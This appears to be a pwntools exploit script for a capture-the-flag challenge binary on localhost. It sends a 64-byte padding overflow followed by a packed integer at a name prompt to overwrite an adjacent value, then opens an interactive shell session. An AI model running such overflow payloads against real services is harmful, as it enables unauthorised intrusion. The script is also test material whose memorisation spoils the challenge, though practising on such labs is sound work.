#!/usr/bin/env python3

from pwn import *

PATH = 'app/chall'

HOST = 'localhost'
PORT = 10001

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def exploit(r):
    r.sendlineafter(b'Name: ', b'A' * 0x40 + p32(1))
    # debug(r)
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    # libc = elf.libc
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)